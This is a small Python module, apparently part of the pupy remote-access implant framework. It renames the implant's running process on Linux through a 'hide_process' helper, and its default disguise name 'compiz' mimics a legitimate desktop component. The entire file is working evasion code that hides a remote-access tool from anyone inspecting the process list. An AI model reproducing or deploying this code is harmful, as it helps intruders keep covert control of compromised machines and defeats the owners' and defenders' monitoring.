""" Change pupy process's name """
from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

__dependencies__ = {
    'linux': ['hide_process']
}

__arguments__ = {
    'name': 'Process name'
}

__compatibility__ = ('linux')

import hide_process

def main(name='compiz'):
    hide_process.change_argv(argv=name)
